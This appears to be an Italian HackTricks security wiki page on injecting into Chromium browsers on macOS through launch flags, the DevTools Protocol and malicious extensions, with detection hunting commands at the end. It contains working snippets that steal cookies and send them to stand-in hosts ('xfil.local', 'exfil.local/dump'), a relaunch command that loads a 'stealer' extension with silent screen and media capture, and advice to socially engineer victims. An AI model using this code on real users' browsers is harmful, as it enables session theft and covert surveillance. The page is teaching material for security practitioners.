# Chromium Injection su macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

I browser basati su Chromium, come Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, utilizzano tutti gli stessi switch da riga di comando, file delle preferenze e interfacce di automazione DevTools. Su macOS, qualsiasi utente con accesso alla GUI può terminare una sessione browser esistente e riaprirla con flag arbitrari, estensioni o endpoint DevTools eseguiti con gli entitlements del target.

#### Avvio di Chromium con flag personalizzati su macOS

macOS mantiene una singola istanza UI per ogni profilo Chromium, quindi la strumentazione normalmente richiede la chiusura forzata del browser (ad esempio con `osascript -e 'tell application "Google Chrome" to quit'`). Gli attaccanti in genere lo riavviano tramite `open -na "Google Chrome" --args <flags>`, così da poter iniettare argomenti senza modificare l'app bundle. Inserire questo comando in un LaunchAgent dell'utente (`~/Library/LaunchAgents/*.plist`) o in un login hook garantisce che il browser manomesso venga riavviato dopo un reboot o un logoff.

#### Flag `--load-extension`

Il flag `--load-extension` carica automaticamente estensioni non pacchettizzate (percorsi separati da virgole). Abbinalo a `--disable-extensions-except` per bloccare le estensioni legittime, forzando l'esecuzione esclusiva del tuo payload. Le estensioni malevole possono richiedere permessi ad alto impatto come `debugger`, `webRequest` e `cookies` per passare ai protocolli DevTools, modificare gli header CSP, effettuare il downgrade di HTTPS o esfiltrare materiale di sessione non appena il browser viene avviato.

#### Flag `--remote-debugging-port` / `--remote-debugging-pipe`

Questi switch espongono il Chrome DevTools Protocol (CDP) tramite TCP o una pipe, consentendo a strumenti esterni di controllare il browser. Google ha osservato un abuso diffuso di questa interfaccia da parte degli infostealer e, a partire da Chrome 136 (marzo 2025), gli switch vengono ignorati per il profilo predefinito, a meno che il browser non venga avviato con un `--user-data-dir` non standard. Questo applica l'App-Bound Encryption ai profili reali, ma gli attaccanti possono comunque creare un profilo nuovo, indurre la vittima ad autenticarsi al suo interno (con phishing o assistenza al triage) e raccogliere cookie, token, stati di trust del dispositivo o registrazioni WebAuthn tramite CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Questo flag reindirizza l'intero profilo del browser (History, Cookies, Login Data, file Preference, ecc.) verso un percorso controllato dall'attaccante. È obbligatorio quando si combinano build moderne di Chrome con `--remote-debugging-port` e mantiene inoltre isolato il profilo manomesso, permettendo di inserire file `Preferences` o `Secure Preferences` preconfigurati che disabilitano i prompt di sicurezza, installano automaticamente estensioni e modificano gli schemi predefiniti.

#### Flag `--use-fake-ui-for-media-stream`

Questo switch bypassa il prompt dei permessi per fotocamera e microfono, così qualsiasi pagina che chiama `getUserMedia` ottiene immediatamente l'accesso. Abbinalo a flag come `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` o ai comandi CDP `Browser.grantPermissions` per catturare silenziosamente audio/video, condividere lo schermo o soddisfare i controlli dei permessi WebRTC senza interazione dell'utente.

## Pattern di Delivery e Riavvio osservati in ambienti reali

L'abuso di CDP è comunemente una fase di **post-exploitation**, piuttosto che il payload iniziale. Una recente campagna su macOS rivolta agli sviluppatori ha utilizzato una fase di build **`Run Script`** di Xcode avvelenata (`PBXShellScriptBuildPhase`), in modo che il codice venisse eseguito solo quando la vittima effettuava il **build** del progetto, non quando si limitava a clonarlo o aprirlo. Dopo la prima esecuzione, il malware ha inoltre infettato altri alberi `.xcodeproj`, aggiunto hook Git `pre-commit` malevoli e cercato altri progetti Xcode negli archivi ZIP.<sup>[[3]](#references)</sup>

Per l'abuso di Chromium questo è importante perché l'attaccante non deve applicare patch direttamente al browser binary. Un breve stager di build-phase / `osascript` può invece installare un **browser wrapper** (LaunchAgent, login item, voce nel Dock, app launcher trojanizzata, ecc.) che riapre il browser legittimo con flag controllati dall'attaccante ogni volta che l'utente lo avvia.<sup>[[3]](#references)</sup>

> [!TIP]
> Sugli endpoint degli sviluppatori, ispeziona i file `.pbxproj`, `.git/hooks/pre-commit` e gli ZIP contenenti `.xcodeproj` alla ricerca di `curl`, `osascript`, `xxd`, `base64` annidato o logica di riavvio di Chrome inattesi.

## Remote Debugging e abuso del DevTools Protocol

Quando Chrome viene riavviato con un `--user-data-dir` dedicato e `--remote-debugging-port`, puoi collegarti tramite CDP (ad esempio con `chrome-remote-interface`, `puppeteer` o `playwright`) e automatizzare workflow con privilegi elevati:

- **Furto di cookie/sessioni:** `Network.getAllCookies` e `Storage.getCookies` restituiscono valori HttpOnly anche quando App-Bound encryption normalmente bloccherebbe l'accesso al filesystem, perché CDP chiede al browser in esecuzione di decrittografarli.
- **Manomissione dei permessi:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` consentono di bypassare i prompt per fotocamera e microfono (specialmente se combinati con `--use-fake-ui-for-media-stream`) o falsificare i controlli di sicurezza basati sulla posizione.
- **Iniezione di keystroke/script:** `Runtime.evaluate` esegue JavaScript arbitrario nella tab attiva, consentendo il furto di credenziali, la modifica del DOM o l'iniezione di beacon di persistenza che sopravvivono alla navigazione.<sup>[[1]](#references)</sup>
- **Esfiltrazione live:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` intercettano richieste e risposte autenticate in tempo reale senza toccare gli artefatti su disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Poiché Chrome 136 blocca CDP sul profilo predefinito, copiare la directory esistente `~/Library/Application Support/Google/Chrome` della vittima in un percorso di staging non consente più di ottenere cookie decrittografati. Al contrario, fate autenticare l'utente tramite social engineering all'interno del profilo strumentato (ad esempio, durante una sessione di supporto "utile") oppure catturate i token MFA in transito tramite hook di rete controllati da CDP.<sup>[[5]](#references)</sup>

### Catena di Backdoor CDP in stile XCSSET

Un pattern pratico di malware consiste nel:

1. Riavviare l'implant o il wrapper userland ogni volta che Chrome viene avviato.
2. Avviare il browser legittimo con `--remote-debugging-port=<port>` e, su Chrome 136+, di solito con un `--user-data-dir=<dir>` associato e non predefinito.
3. Avviare un helper che si connette al WebSocket CDP locale e registra un hook pre-documento con `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Questo helper può iniettare JavaScript **prima** dell'esecuzione del codice del sito, il che è ideale per eseguire hooking su `window.fetch`, `XMLHttpRequest`, wallet provider o flussi di autofill senza modificare i file sul disco.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Una variante più potente trasforma il browser in un **bridge di comandi dell'host**: il JavaScript iniettato emette un `console.log` con delimitatori, l'helper locale monitora `Runtime.consoleAPICalled`, rimuove il marker, esegue il contenuto restante tramite la shell dell'host (ad esempio `exec.Command` di Go) e restituisce stdout/stderr tramite il WebSocket dell'attacker. Questo trasforma l'esecuzione di script a livello di tab in una reverse shell per lo più fileless.<sup>[[3]](#references)</sup>

## Injection basata su Extension tramite Debugger API

La ricerca del 2023 "Chrowned by an Extension" ha dimostrato che una malicious extension che utilizza la API `chrome.debugger` può collegarsi a qualsiasi tab e ottenere gli stessi poteri DevTools di `--remote-debugging-port`.<sup>[[6]](#references)</sup> Questo infrange le ipotesi originali di isolamento (le extension rimangono nel proprio contesto) e consente:

- Furto silenzioso di cookie e credenziali tramite `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modifica delle autorizzazioni dei siti (camera, microfono, geolocalizzazione) e bypass degli interstitial di sicurezza, permettendo alle pagine di phishing di impersonare i dialoghi di Chrome.
- Manomissione on-path degli avvisi TLS, dei download o dei prompt WebAuthn tramite il controllo programmatico di `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` o `Security.handleCertificateError`.

Carica l'extension con `--load-extension`/`--disable-extensions-except`, in modo che non sia richiesta alcuna interazione dell'utente. Uno script di background minimale che weaponizza la API è il seguente:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'estensione può anche sottoscriversi agli eventi `Debugger.paused` per leggere le variabili JavaScript, modificare gli script inline o inserire breakpoint personalizzati che persistono durante la navigazione. Poiché tutto viene eseguito all'interno della sessione GUI dell'utente, Gatekeeper e TCC non vengono attivati, rendendo questa tecnica ideale per malware che ha già ottenuto l'esecuzione nel contesto dell'utente.<sup>[[6]](#references)</sup>

## Rilevamento e Hunting

- Generare un alert sui browser Chromium avviati con `--remote-debugging-port`, `--remote-debugging-pipe` o uno `--user-data-dir` sospetto, soprattutto quando il processo padre è `bash`, `sh`, `osascript`, `xcodebuild` o un helper di LaunchAgent.
- Cercare catene brevi in cui un helper apre un WebSocket CDP locale, registra `Page.addScriptToEvaluateOnNewDocument` e quindi stabilisce una connessione WebSocket/HTTPS outbound di lunga durata.
- Cercare bridge console-to-shell correlando l'attività `Runtime.consoleAPICalled` del browser con shell figlie o processi helper che eseguono comandi forniti dall'attacker.
- Sui Mac degli sviluppatori, esaminare le voci `PBXShellScriptBuildPhase` nei file `.pbxproj`, gli hook Git `pre-commit`, i relauncher del Dock/login item e i progetti Xcode contenuti in ZIP alla ricerca dell'installazione di wrapper del browser.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Strumenti

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizza l'avvio di Chromium con estensioni payload ed espone hook CDP interattivi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tool simile, focalizzato sull'intercettazione del traffico e sulla strumentazione del browser per operatori macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Libreria Node.js per eseguire tramite script dump del Chrome DevTools Protocol (cookie, DOM, permessi) quando un'istanza con `--remote-debugging-port` è attiva.

### Esempio
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trova altri esempi nei link agli strumenti.

## Riferimenti

- [1] [Chrome DevTools Protocol - dominio Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - dominio Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [L'assassino di Xcode ritorna: analisi approfondita dell'ultima versione di XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) su X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Modifiche agli switch di remote debugging per migliorare la sicurezza - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: abuso del Chrome DevTools Protocol tramite la Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
